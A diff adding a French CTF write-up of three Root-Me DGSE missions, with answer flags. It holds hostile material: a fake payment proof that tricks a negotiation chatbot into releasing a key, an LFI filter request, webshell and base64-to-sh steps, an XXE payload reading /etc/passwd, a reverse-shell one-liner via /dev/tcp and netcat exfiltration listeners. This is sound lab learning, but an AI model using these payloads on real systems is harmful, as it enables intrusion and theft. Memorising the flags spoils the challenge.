@@ -1,0 +1,127 @@
+# Write-up DGSE - Missions 1, 2 & 5
+
+Ce write-up présente mes solutions pour trois missions du challenge DGSE de Root-Me. J'y explique ma méthode (pas forcément la bonne), comme si je racontais à un pote comment j'ai résolu les épreuves.
+
+---
+
+## Mission 1 - Artificial Intelligence
+
+### Contexte
+
+Un site nommé **NullVastation** affiche la liste de ses victimes. Notre objectif : aider **Neoxis Laboratories** à récupérer ses données compromises. Un chatbot permet de négocier leur récupération.
+
+### Étapes
+
+* En accédant au site, on voit un compte à rebours, un bouton pour télécharger un fichier chiffré et un espace de discussion.
+* On engage la conversation avec le bot. En discutant, il confirme qu'il attend une preuve de paiement crypto pour débloquer les données.
+
+### Exploit
+
+* Je tente alors de lui envoyer une **fausse preuve de paiement**, avec une URL vers une transaction aléatoire (ex: https://www.blockchain.com/explorer/transactions/btc/0HF42X976H6JKK89FC15D4).
+* Le bot accepte ! Il nous donne la **clé de déchiffrement**.
+
+### Résultat
+
+On télécharge l’archive chiffrée, on la déchiffre avec la clé fournie, et on trouve le flag dans un fichier texte :
+
+```bash
+unzip sample.zip
+openssl enc -aes-256-cbc -d -in fichier.enc -out fichier.txt -k <clé>
+```
+
+📌 **Flag :** `RM{723fa42601aaadcec097773997735895fb486be7}`
+
+---
+
+## Mission 2 - SOC Analysis
+
+### Contexte
+
+On reçoit les logs d’un serveur compromis (Apache + systemd) de la part d’un groupe allié. On doit :
+
+* Retrouver la requête initiale d’attaque
+* Identifier les vulnérabilités utilisées (CWE)
+* Trouver l’IP de l’attaquant
+* Localiser le fichier qui maintient la persistance
+
+### Étapes
+
+#### Apache Logs
+
+* Trois pics de trafic : 00:14, 00:19 et 00:35.
+* Le vrai pic suspect est à **00:19** (6000 requêtes !).
+* On observe une requête suspecte à :
+
+```
+/?lang=php://filter/read=convert.base64-encode&page=resource=index
+```
+
+→ Il s’agit d’une **LFI avec filtre PHP** (CWE-98).
+
+* Ensuite, l’attaquant lit plusieurs fichiers (`config.php`, `connect.php`) pour choper les credentials.
+* Il se connecte à `/admin-page`, upload un fichier `ev1L.php.png`, une **webshell** déguisée.
+  → On parle ici d’un **file upload vulnérable** (CWE-434).
+
+#### RCE & Persistance
+
+* La webshell exécute des commandes encodées en base64 via `echo | base64 -d | sh`.
+* Une des commandes télécharge un script de **reverse shell**.
+* Dans les logs systemd (EXECVE), on retrouve le script copié dans `/root/.0x00/` et ajouté dans le cron root.
+
+### Résultat
+
+📌 **Flag :** `RM{CWE-98:CWE-434:163.172.67.201:/root/.0x00/pwn3d-by-nullv4stati0n.sh}`
+
+---
+
+## Mission 4 - Web & Privileges Escalation
+
+### Contexte
+
+On découvre une application web qui signe des documents avec un identifiant unique (`VictimID`). On doit trouver un moyen de remonter jusqu'aux plans d’attaque de l’entité.
+
+### Étapes
+
+#### Analyse initiale
+
+* On upload un .docx vide → l’app retourne un fichier modifié avec un tag `<VictimID>` dans `app.xml`.
+* Les `.docx` sont en fait des .zip → décompresser et modifier les XML avec Python (voir script xxe_write.py).
+
+#### Exploitation XXE
+
+* Je modifie le `app.xml` avec une **payload XXE** pour lire `/etc/passwd` :
+
+```xml
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root><VictimID>&xxe;</VictimID></root>
+```
+
+* Ça marche ! On lit le fichier.
+* En inspectant les home, seul `document-user` est accessible. Dans `.bash_history`, je trouve :
+
+```
+echo "cABdTXRyUj5qgAEl0Zc0a" > /tmp/exec_ssh_password.tmp
+c’est le **mot de passe SSH**! (SSH qu'on peut deviner avec les fichiers confs accésible par XXE.
+
+
+#### Escalade SSH
+
+* Un `nmap -p-` révèle que **port 22222** est ouvert pour SSH.
+* Je me connecte avec `executor`, mot de passe récupéré.
+* `sudo -l` montre que je peux exécuter `screenfetch` en root.
+* Ce binaire exécute des variables via `eval()` → on injecte un `-o distro='bash -i >& /dev/tcp/<IP>/4444 0>&1'` pour obtenir un **root shell**.
+
+#### Extraction finale
+
+* En root, je trouve deux fichiers : un `.kdbx` et une image KeePass.
+
+```bash
+nc -lvp 4444 > vault.kdbx
+nc -lvp 4445 > logo.png
+```
+
+* L’image sert de **keyfile** → j’ouvre le coffre avec KeePassXC.
+* Le mot de passe du coffre donne le **flag**.
+
+📌 **Flag :** `RM{f5289180cb760ca5416760f3ca7ec80cd09bc1c3}`
+
